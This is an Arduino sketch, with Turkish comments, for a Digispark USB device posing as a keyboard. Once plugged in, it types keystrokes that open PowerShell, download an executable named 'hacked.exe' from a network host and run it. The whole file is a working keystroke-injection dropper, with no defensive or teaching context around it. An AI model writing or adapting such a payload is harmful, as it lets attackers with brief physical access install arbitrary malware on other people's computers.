#include"DigiKeyboard.h"
void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:

DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
DigiKeyboard.print("powershell");
    DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
DigiKeyboard.print("$WebClient=New-Object System.Net.Webclient"); //internetten dosya indirmek için bir obje oluşturuyoruz.
    DigiKeyboard.delay(5000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(5000);
DigiKeyboard.print("$WebClient.DownloadFile('http://192.168.1.49/hacked.exe','hacked.exe')");  //indirilcek dosyanın linkini yazıyoruz virgül koyuyoruz ve kaydedilmesini istediğimiz adı yazıyoruz.
    DigiKeyboard.delay(5000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(15000);
DigiKeyboard.print("exit");
    DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
DigiKeyboard.print("hacked.exe");
    DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);




    


}
